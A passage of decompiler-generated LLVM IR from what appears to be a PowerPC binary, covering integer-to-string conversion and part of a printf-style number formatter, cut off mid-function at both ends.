  %v2_10009aa4 = sdiv i32 %v1_10009aa4, 65536
  br label %dec_label_pc_10009aa8

dec_label_pc_10009aa8:                            ; preds = %dec_label_pc_10009a9c, %dec_label_pc_10009a94, %dec_label_pc_10009aa4
  %v0_10009aa8 = phi i32 [ %v2_10009a8c, %dec_label_pc_10009a9c ], [ %v1_10009a94, %dec_label_pc_10009a94 ], [ %v2_10009aa4, %dec_label_pc_10009aa4 ]
  %tmp = icmp slt i32 %v0_10009aa8, 0
  %v1_10009aac = zext i1 %tmp to i32
  %v2_10009aac = ashr i32 %v0_10009aa8, 31
  %v3_10009aac = and i32 %v2_10009aac, -2
  %v4_10009aac = or i32 %v3_10009aac, %v1_10009aac
  ret i32 %v4_10009aac

; uselistorder directives
  uselistorder i32 %v0_10009aa8, { 1, 0 }
  uselistorder i32 %v2_10009a8c, { 2, 0, 1 }
  uselistorder i1 %v3_10009a74, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_10009aa8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009a7c, { 1, 0 }
  uselistorder label %dec_label_pc_10009a68, { 2, 0, 1 }
}

define i32 @function_10009ab4(i16* %arg1) local_unnamed_addr {
dec_label_pc_10009ab4:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10009ab4 = load i32, i32* @r4, align 4
  %v3_10009ab4 = icmp eq i32 %v0_10009ab4, 256
  br i1 %v3_10009ab4, label %dec_label_pc_10009ac0, label %dec_label_pc_10009ac8

dec_label_pc_10009ac0:                            ; preds = %dec_label_pc_10009ab4
  %v0_10009ac0 = load i32, i32* @r6, align 4
  %v1_10009ac0 = trunc i32 %v0_10009ac0 to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_10009ac0, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_10009ac8:                            ; preds = %dec_label_pc_10009ab4
  %v3_10009ab8 = icmp eq i32 %v0_10009ab4, 2048
  br i1 %v3_10009ab8, label %dec_label_pc_10009ad0, label %dec_label_pc_10009adc

dec_label_pc_10009ad0:                            ; preds = %dec_label_pc_10009ac8
  %v0_10009ad0 = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_10009ad0, i32* %tmp2, align 4
  %v0_10009ad4 = load i32, i32* @r6, align 4
  %v3_10009ad4 = add i32 %tmp, 4
  %v4_10009ad4 = inttoptr i32 %v3_10009ad4 to i32*
  store i32 %v0_10009ad4, i32* %v4_10009ad4, align 4
  ret i32 %tmp

dec_label_pc_10009adc:                            ; preds = %dec_label_pc_10009ac8
  %v3_10009ac8 = icmp eq i32 %v0_10009ab4, 512
  %v0_10009ae0 = load i32, i32* @r6, align 4
  br i1 %v3_10009ac8, label %dec_label_pc_10009ae0, label %dec_label_pc_10009ae8

dec_label_pc_10009ae0:                            ; preds = %dec_label_pc_10009adc
  %v1_10009ae0 = trunc i32 %v0_10009ae0 to i16
  store i16 %v1_10009ae0, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_10009ae8:                            ; preds = %dec_label_pc_10009adc
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_10009ae0, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 3, 0, 1, 2, 4 }
}

define i32 @function_10009af0(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10009af0:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  store i32 %arg4, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10009af0 = load i32, i32* %r7.global-to-local, align 4
  %v3_10009af0 = icmp eq i32 %v0_10009af0, 0
  store i1 %v3_10009af0, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* %r30.global-to-local, align 4
  %tmp12 = icmp sgt i32 %v0_10009af0, -1
  br i1 %tmp12, label %dec_label_pc_10009b24, label %dec_label_pc_10009b04

dec_label_pc_10009b04:                            ; preds = %dec_label_pc_10009af0
  %v0_10009b04 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009b08 = sub i32 0, %v0_10009af0
  store i32 %v1_10009b08, i32* %r7.global-to-local, align 4
  %tmp13 = icmp sgt i32 %v0_10009b04, -1
  br i1 %tmp13, label %dec_label_pc_10009b24, label %dec_label_pc_10009b10

dec_label_pc_10009b10:                            ; preds = %dec_label_pc_10009b04
  %v0_10009b10 = load i32, i32* %r6.global-to-local, align 4
  %v1_10009b10 = sub i32 0, %v0_10009b10
  %v2_10009b10 = sub i32 -1, %v0_10009b10
  store i32 %v1_10009b10, i32* %r6.global-to-local, align 4
  %v4_10009b10 = icmp uge i32 %v2_10009b10, %v1_10009b10
  %v1_10009b14 = sub i32 -1, %v0_10009b04
  %v3_10009b14 = zext i1 %v4_10009b10 to i32
  %v4_10009b14 = add i32 %v3_10009b14, %v1_10009b14
  store i32 %v4_10009b14, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009b24

dec_label_pc_10009b24:                            ; preds = %dec_label_pc_10009af0, %dec_label_pc_10009b04, %dec_label_pc_10009b10
  %v1_10009b28 = phi i32 [ %v1_10009b08, %dec_label_pc_10009b10 ], [ %v1_10009b08, %dec_label_pc_10009b04 ], [ %v0_10009af0, %dec_label_pc_10009af0 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10009b10 ], [ 0, %dec_label_pc_10009b04 ], [ 0, %dec_label_pc_10009af0 ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_10009b28 = udiv i32 -1, %v1_10009b28
  store i32 %v2_10009b28, i32* %r8.global-to-local, align 4
  %v2_10009b30 = load i32, i32* %r3.global-to-local, align 4
  %v3_10009b30 = inttoptr i32 %v2_10009b30 to i8*
  store i8 0, i8* %v3_10009b30, align 1
  %v0_10009b34 = load i32, i32* %r8.global-to-local, align 4
  %v1_10009b34 = load i32, i32* %r7.global-to-local, align 4
  %v2_10009b34 = mul i32 %v1_10009b34, %v0_10009b34
  %v1_10009b38 = sub i32 0, %v2_10009b34
  store i32 %v1_10009b38, i32* %r31.global-to-local, align 4
  %v4_10009b3c = icmp eq i32 %v1_10009b34, %v1_10009b38
  br i1 %v4_10009b3c, label %dec_label_pc_10009b44, label %dec_label_pc_10009b4c

dec_label_pc_10009b44:                            ; preds = %dec_label_pc_10009b24
  %v1_10009b44 = add i32 %v0_10009b34, 1
  store i32 %v1_10009b44, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009b4c

dec_label_pc_10009b4c:                            ; preds = %dec_label_pc_10009b24, %dec_label_pc_10009b44
  %v0_10009b4c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10009b4c, i32* %r12.global-to-local, align 4
  br label %dec_label_pc_10009b50

dec_label_pc_10009b50thread-pre-split:            ; preds = %dec_label_pc_10009ba4
  %v0_10009b50.pr = load i32, i32* %r12.global-to-local, align 4
  %v1_10009b54.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10009b50

dec_label_pc_10009b50:                            ; preds = %dec_label_pc_10009b50thread-pre-split, %dec_label_pc_10009b4c
  %v1_10009b98 = phi i32 [ %v1_10009b54.pre, %dec_label_pc_10009b50thread-pre-split ], [ %v1_10009b34, %dec_label_pc_10009b4c ]
  %v1_10009b68 = phi i32 [ %v0_10009b50.pr, %dec_label_pc_10009b50thread-pre-split ], [ %v0_10009b4c, %dec_label_pc_10009b4c ]
  %v3_10009b50 = icmp eq i32 %v1_10009b68, 0
  %v0_10009b54 = load i32, i32* %r6.global-to-local, align 4
  %v2_10009b54 = udiv i32 %v0_10009b54, %v1_10009b98
  br i1 %v3_10009b50, label %dec_label_pc_10009b98, label %dec_label_pc_10009b5c

dec_label_pc_10009b5c:                            ; preds = %dec_label_pc_10009b50
  %v2_10009b5c = udiv i32 %v1_10009b68, %v1_10009b98
  %v2_10009b60 = mul i32 %v2_10009b5c, %v1_10009b98
  %v2_10009b64 = mul i32 %v2_10009b54, %v1_10009b98
  %v2_10009b68 = sub i32 %v1_10009b68, %v2_10009b60
  store i32 %v2_10009b5c, i32* %r12.global-to-local, align 4
  %v0_10009b70 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009b70 = mul i32 %v0_10009b70, %v2_10009b68
  %v2_10009b74 = sub i32 %v0_10009b54, %v2_10009b64
  %v2_10009b78 = add i32 %v2_10009b70, %v2_10009b74
  %v0_10009b7c = load i32, i32* %r8.global-to-local, align 4
  %v2_10009b7c = mul i32 %v0_10009b7c, %v2_10009b68
  %v2_10009b80 = udiv i32 %v2_10009b78, %v1_10009b98
  %v2_10009b84 = add i32 %v2_10009b7c, %v2_10009b54
  %v2_10009b88 = mul i32 %v2_10009b80, %v1_10009b98
  %v2_10009b8c = add i32 %v2_10009b84, %v2_10009b80
  store i32 %v2_10009b8c, i32* %r6.global-to-local, align 4
  %v2_10009b90 = sub i32 %v2_10009b78, %v2_10009b88
  store i32 %v2_10009b90, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009ba4

dec_label_pc_10009b98:                            ; preds = %dec_label_pc_10009b50
  %v2_10009b98 = mul i32 %v2_10009b54, %v1_10009b98
  %v2_10009b9c = sub i32 %v0_10009b54, %v2_10009b98
  store i32 %v2_10009b9c, i32* %r5.global-to-local, align 4
  store i32 %v2_10009b54, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10009ba4

dec_label_pc_10009ba4:                            ; preds = %dec_label_pc_10009b5c, %dec_label_pc_10009b98
  %v1_10009ba8 = phi i32 [ %v2_10009b5c, %dec_label_pc_10009b5c ], [ 0, %dec_label_pc_10009b98 ]
  %v0_10009ba8 = phi i32 [ %v2_10009b8c, %dec_label_pc_10009b5c ], [ %v2_10009b54, %dec_label_pc_10009b98 ]
  %v0_10009bac = phi i32 [ %v2_10009b90, %dec_label_pc_10009b5c ], [ %v2_10009b9c, %dec_label_pc_10009b98 ]
  %v2_10009ba8 = or i32 %v0_10009ba8, %v1_10009ba8
  %v5_10009ba8 = icmp eq i32 %v2_10009ba8, 0
  store i1 %v5_10009ba8, i1* %cr0_eq.global-to-local, align 1
  %v1_10009bb0 = load i32, i32* %r30.global-to-local, align 4
  %v0_10009bb4 = load i32, i32* %r3.global-to-local, align 4
  %v1_10009bb4 = add i32 %v0_10009bb4, -1
  store i32 %v1_10009bb4, i32* %r3.global-to-local, align 4
  %tmp14 = icmp ult i32 %v0_10009bac, 10
  %v1_10009bac.v2_10009bb0.v = select i1 %tmp14, i32 48, i32 %v1_10009bb0
  %v1_10009bac.v2_10009bb0 = add i32 %v0_10009bac, %v1_10009bac.v2_10009bb0.v
  %extract.t9.extract.t = trunc i32 %v1_10009bac.v2_10009bb0 to i8
  %v3_10009bc4 = inttoptr i32 %v1_10009bb4 to i8*
  store i8 %extract.t9.extract.t, i8* %v3_10009bc4, align 1
  %v0_10009bc8 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10009bc8, label %dec_label_pc_10009bcc, label %dec_label_pc_10009b50thread-pre-split

dec_label_pc_10009bcc:                            ; preds = %dec_label_pc_10009ba4
  %v0_10009bcc = load i32, i32* @r29, align 4
  %v3_10009bcc = icmp eq i32 %v0_10009bcc, 0
  br i1 %v3_10009bcc, label %dec_label_pc_10009bcc.dec_label_pc_10009bdc_crit_edge, label %dec_label_pc_10009bd4

dec_label_pc_10009bcc.dec_label_pc_10009bdc_crit_edge: ; preds = %dec_label_pc_10009bcc
  %v0_10009be4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009bdc

dec_label_pc_10009bd4:                            ; preds = %dec_label_pc_10009bcc
  %v2_10009bd8 = load i32, i32* %r3.global-to-local, align 4
  %v3_10009bd8 = add i32 %v2_10009bd8, -1
  %v4_10009bd8 = inttoptr i32 %v3_10009bd8 to i8*
  store i8 45, i8* %v4_10009bd8, align 1
  store i32 %v3_10009bd8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009bdc

dec_label_pc_10009bdc:                            ; preds = %dec_label_pc_10009bcc.dec_label_pc_10009bdc_crit_edge, %dec_label_pc_10009bd4
  %v0_10009be4 = phi i32 [ %v0_10009be4.pre, %dec_label_pc_10009bcc.dec_label_pc_10009bdc_crit_edge ], [ %v3_10009bd8, %dec_label_pc_10009bd4 ]
  ret i32 %v0_10009be4

; uselistorder directives
  uselistorder i32 %v2_10009b5c, { 1, 2, 0 }
  uselistorder i32 %v2_10009b54, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_10009b98, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_10009b34, { 1, 2, 0 }
  uselistorder i32 %v0_10009b34, { 1, 0 }
  uselistorder i32 %v0_10009af0, { 1, 2, 0, 3 }
  uselistorder i32* %r8.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i1* %cr0_eq.global-to-local, { 1, 2, 0 }
  uselistorder i8 45, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10009ba4, { 1, 0 }
  uselistorder label %dec_label_pc_10009b4c, { 1, 0 }
  uselistorder label %dec_label_pc_10009b24, { 2, 1, 0 }
}

define i32 @function_10009be8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10009be8:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_10009be8 = load i32, i32* @lr, align 4
  store i32 %v0_10009be8, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_10009c04 = add i32 %tmp, 11
  %v2_10009c04 = inttoptr i32 %v1_10009c04 to i8*
  %v3_10009c04 = load i8, i8* %v2_10009c04, align 1
  %v4_10009c04 = zext i8 %v3_10009c04 to i32
  store i32 %v4_10009c04, i32* %r31.global-to-local, align 4
  %v1_10009c08 = or i32 %v4_10009c04, 32
  %v1_10009c0c = icmp ult i32 %v1_10009c08, 97
  %v3_10009c0c = icmp eq i32 %v1_10009c08, 97
  store i1 %v1_10009c0c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009c0c, i1* %cr7_eq.global-to-local, align 1
  store i32 101, i32* %r0.global-to-local, align 4
  %v1_10009c18 = add i32 %tmp, 4
  %v2_10009c18 = inttoptr i32 %v1_10009c18 to i32*
  %v3_10009c18 = load i32, i32* %v2_10009c18, align 4
  store i32 %v3_10009c18, i32* %r28.global-to-local, align 4
  %v2_10009c1c = load i32, i32* %arg2, align 4
  store i32 %v2_10009c1c, i32* %r30.global-to-local, align 4
  br i1 %v3_10009c0c, label %dec_label_pc_10009c24, label %dec_label_pc_10009c2c

dec_label_pc_10009c24:                            ; preds = %dec_label_pc_10009be8
  %v1_10009c24 = add nuw nsw i32 %v4_10009c04, 6
  store i32 %v1_10009c24, i32* %r0.global-to-local, align 4
  %v1_10009c28 = urem i32 %v1_10009c24, 256
  store i32 %v1_10009c28, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009c2c

dec_label_pc_10009c2c:                            ; preds = %dec_label_pc_10009be8, %dec_label_pc_10009c24
  %v0_10009ce0 = phi i32 [ %v4_10009c04, %dec_label_pc_10009be8 ], [ %v1_10009c28, %dec_label_pc_10009c24 ]
  %v1_10009c2c = icmp slt i32 %v2_10009c1c, 0
  %v3_10009c2c = icmp eq i32 %v2_10009c1c, 0
  store i1 %v1_10009c2c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009c2c, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_10009c1c, -1
  br i1 %tmp75, label %dec_label_pc_10009c38, label %dec_label_pc_10009c34

dec_label_pc_10009c34:                            ; preds = %dec_label_pc_10009c2c
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10009c38

dec_label_pc_10009c38:                            ; preds = %dec_label_pc_10009c2c, %dec_label_pc_10009c34
  %v0_10009df044 = phi i32 [ %v2_10009c1c, %dec_label_pc_10009c2c ], [ 6, %dec_label_pc_10009c34 ]
  %v1_10009c38 = add i32 %tmp, 12
  %v2_10009c38 = inttoptr i32 %v1_10009c38 to i32*
  %v3_10009c38 = load i32, i32* %v2_10009c38, align 4
  store i32 %v3_10009c38, i32* %r9.global-to-local, align 4
  %v1_10009c3c = and i32 %v3_10009c38, 2
  %v3_10009c3c = icmp eq i32 %v1_10009c3c, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  br i1 %v3_10009c3c, label %dec_label_pc_10009c54, label %dec_label_pc_10009c60

dec_label_pc_10009c54:                            ; preds = %dec_label_pc_10009c38
  %v1_10009c54 = urem i32 %v3_10009c38, 2
  store i32 %v1_10009c54, i32* %r7.global-to-local, align 4
  %v3_10009c54 = icmp eq i32 %v1_10009c54, 0
  br i1 %v3_10009c54, label %dec_label_pc_10009c64, label %dec_label_pc_10009c60

dec_label_pc_10009c60:                            ; preds = %dec_label_pc_10009c54, %dec_label_pc_10009c38
  %storemerge = phi i32 [ 43, %dec_label_pc_10009c38 ], [ 32, %dec_label_pc_10009c54 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_10009c60 = trunc i32 %storemerge to i8
  store i8 %v6_10009c60, i8* %stack_var_-200, align 1
  br label %dec_label_pc_10009c64

dec_label_pc_10009c64:                            ; preds = %dec_label_pc_10009c54, %dec_label_pc_10009c60
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_10009c2c, label %dec_label_pc_10009dc8, label %dec_label_pc_10009ce0

dec_label_pc_10009ce0:                            ; preds = %dec_label_pc_10009c64
  %v1_10009ce0 = icmp ult i32 %v0_10009ce0, 96
  %v2_10009ce0 = icmp ugt i32 %v0_10009ce0, 96
  %v3_10009ce0 = icmp eq i32 %v0_10009ce0, 96
  store i1 %v1_10009ce0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009ce0, i1* %cr7_eq.global-to-local, align 1
  %v2_10009ce8 = add i32 %tmp, 16
  %v3_10009ce8 = inttoptr i32 %v2_10009ce8 to i32*
  store i32 32, i32* %v3_10009ce8, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_10009ce0, label %dec_label_pc_10009d0c, label %dec_label_pc_10009d00

dec_label_pc_10009d00:                            ; preds = %dec_label_pc_10009ce0
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009d0c

dec_label_pc_10009d0c:                            ; preds = %dec_label_pc_10009ce0, %dec_label_pc_10009d00
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_1000f2c8.290 to i32), i32 8), %dec_label_pc_10009ce0 ], [ add (i32 ptrtoint ([4 x i8]* @global_var_1000f2c8.290 to i32), i32 12), %dec_label_pc_10009d00 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1000f2c8.290 to i32), i32* %r9.global-to-local, align 4
  %v2_10009d18 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_10009d18, i32* %r8.global-to-local, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000a1b8

dec_label_pc_10009dc8:                            ; preds = %dec_label_pc_10009c64
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10009dcc = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_10009dcc, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_10009e18 = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_10009dec

dec_label_pc_10009dec:                            ; preds = %dec_label_pc_10009e6c.dec_label_pc_10009dec_crit_edge, %dec_label_pc_10009dc8
  %v0_10009df0 = phi i32 [ %v0_10009df0.pre, %dec_label_pc_10009e6c.dec_label_pc_10009dec_crit_edge ], [ %v0_10009df044, %dec_label_pc_10009dc8 ]
  %v3_10009df0 = call %1 @__asm_cror(i32 %v0_10009df0, i32 %tmp, i32 %v0_10009df0)
  %v11_10009df0 = extractvalue %1 %v3_10009df0, 7
  store i4 %v11_10009df0, i4* @cr4, align 1
  %v0_10009df4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10009df4, label %dec_label_pc_10009e08, label %dec_label_pc_10009e1c

dec_label_pc_10009e08:                            ; preds = %dec_label_pc_10009dec
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10009e1c

dec_label_pc_10009e1c:                            ; preds = %dec_label_pc_10009dec, %dec_label_pc_10009e08
  %storemerge2 = phi i32 [ %v1_10009e18, %dec_label_pc_10009e08 ], [ %tmp55, %dec_label_pc_10009dec ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_10009e2c = load i32, i32* %r6.global-to-local, align 4
  %v1_10009e2c = add i32 %v0_10009e2c, 9
  store i32 %v1_10009e2c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009e48

dec_label_pc_10009e48:                            ; preds = %dec_label_pc_10009e48.dec_label_pc_10009e48_crit_edge, %dec_label_pc_10009e1c
  %v1_10009e50 = phi i32 [ %v1_10009e50.pre, %dec_label_pc_10009e48.dec_label_pc_10009e48_crit_edge ], [ %v1_10009e2c, %dec_label_pc_10009e1c ]
  %v0_10009e4c = phi i32 [ %v0_10009e4c.pre, %dec_label_pc_10009e48.dec_label_pc_10009e48_crit_edge ], [ 0, %dec_label_pc_10009e1c ]
  %v1_10009e48 = phi i32 [ %v1_10009e48.pre, %dec_label_pc_10009e48.dec_label_pc_10009e48_crit_edge ], [ 10, %dec_label_pc_10009e1c ]
  %v1_10009e58 = phi i32 [ %v0_10009e48.pre, %dec_label_pc_10009e48.dec_label_pc_10009e48_crit_edge ], [ %storemerge2, %dec_label_pc_10009e1c ]
  %v2_10009e48 = udiv i32 %v1_10009e58, %v1_10009e48
  store i32 %v2_10009e48, i32* %r0.global-to-local, align 4
  %v1_10009e4c = add i32 %v0_10009e4c, 1
  store i32 %v1_10009e4c, i32* %r8.global-to-local, align 4
  %v2_10009e50 = sub i32 %v1_10009e50, %v1_10009e4c
  store i32 %v2_10009e50, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_10009e48, -10
  store i32 %v2_10009e48, i32* %r10.global-to-local, align 4
  %v2_10009e58 = add i32 %v1_10009e58, 48
  %v1_10009e60 = add i32 %v2_10009e58, %tmp76
  store i32 %v1_10009e60, i32* %r9.global-to-local, align 4
  %v1_10009e64 = trunc i32 %v1_10009e60 to i8
  %v3_10009e64 = inttoptr i32 %v2_10009e50 to i8*
  store i8 %v1_10009e64, i8* %v3_10009e64, align 1
  %v0_10009e68 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009e68 = add i32 %v0_10009e68, -1
  store i32 %v1_10009e68, i32* %ctr.global-to-local, align 4
  %v2_10009e68 = icmp eq i32 %v1_10009e68, 0
  br i1 %v2_10009e68, label %dec_label_pc_10009e6c, label %dec_label_pc_10009e48.dec_label_pc_10009e48_crit_edge

dec_label_pc_10009e48.dec_label_pc_10009e48_crit_edge: ; preds = %dec_label_pc_10009e48
  %v0_10009e48.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10009e48.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10009e4c.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10009e50.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10009e48

dec_label_pc_10009e6c:                            ; preds = %dec_label_pc_10009e48
  %v0_10009e6c = load i32, i32* %r7.global-to-local, align 4
  %v1_10009e6c = icmp slt i32 %v0_10009e6c, 0
  %v3_10009e6c = icmp eq i32 %v0_10009e6c, 0
  store i1 %v1_10009e6c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009e6c, i1* %cr7_eq.global-to-local, align 1
  %v1_10009e70 = add i32 %v0_10009e6c, 1
  store i32 %v1_10009e70, i32* %r7.global-to-local, align 4
  br i1 %v3_10009e6c, label %dec_label_pc_10009e6c.dec_label_pc_10009dec_crit_edge, label %dec_label_pc_10009e78

dec_label_pc_10009e6c.dec_label_pc_10009dec_crit_edge: ; preds = %dec_label_pc_10009e6c
  %v0_10009df0.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10009dec

dec_label_pc_10009e78:                            ; preds = %dec_label_pc_10009e6c
  %v0_10009e78 = load i32, i32* %r31.global-to-local, align 4
  %v1_10009e78 = icmp ult i32 %v0_10009e78, 96
  %v2_10009e78 = icmp ugt i32 %v0_10009e78, 96
  %v3_10009e78 = icmp eq i32 %v0_10009e78, 96
  store i1 %v1_10009e78, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009e78, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10009e78, label %dec_label_pc_10009e90, label %dec_label_pc_10009e80

dec_label_pc_10009e80:                            ; preds = %dec_label_pc_10009e78
  %v1_10009e88 = add i32 %v0_10009e78, 32
  store i32 %v1_10009e88, i32* %r0.global-to-local, align 4
  %v1_10009e8c = urem i32 %v1_10009e88, 256
  store i32 %v1_10009e8c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009e90

dec_label_pc_10009e90:                            ; preds = %dec_label_pc_10009e78, %dec_label_pc_10009e80
  %v0_10009ea8 = phi i32 [ %v1_10009e8c, %dec_label_pc_10009e80 ], [ %v0_10009e78, %dec_label_pc_10009e78 ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_10009e80 ], [ 101, %dec_label_pc_10009e78 ]
  %v1_10009e90 = icmp slt i32 %v0_10009ea8, 103
  %v3_10009e90 = icmp eq i32 %v0_10009ea8, 103
  store i1 %v1_10009e90, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009e90, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009e90, label %dec_label_pc_10009e98, label %dec_label_pc_10009ea8

dec_label_pc_10009e98:                            ; preds = %dec_label_pc_10009e90
  %v0_10009e98 = load i32, i32* %r30.global-to-local, align 4
  %v1_10009e98 = icmp slt i32 %v0_10009e98, 0
  %v3_10009e98 = icmp eq i32 %v0_10009e98, 0
  store i1 %v1_10009e98, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009e98, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009e98, label %dec_label_pc_10009eb0, label %dec_label_pc_10009ea0

dec_label_pc_10009ea0:                            ; preds = %dec_label_pc_10009e98
  %v1_10009ea0 = add i32 %v0_10009e98, -1
  store i32 %v1_10009ea0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10009eb0

dec_label_pc_10009ea8:                            ; preds = %dec_label_pc_10009e90
  %v1_10009ea8 = icmp slt i32 %v0_10009ea8, 102
  %v3_10009ea8 = icmp eq i32 %v0_10009ea8, 102
